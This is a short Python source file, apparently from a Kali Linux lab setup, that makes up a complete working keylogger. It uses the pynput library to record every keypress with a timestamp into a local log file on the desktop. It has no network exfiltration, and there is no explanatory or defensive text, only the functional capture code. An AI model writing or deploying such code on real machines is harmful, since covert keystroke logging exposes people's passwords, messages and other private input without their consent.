# pynputkey.py
import pynput
from pynput.keyboard import Key, Listener
import logging
import os

log_dir = "/home/kali/Desktop/log"
log_file = "keylog.txt"

# Create the log directory if it doesn't exist
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=os.path.join(log_dir, log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
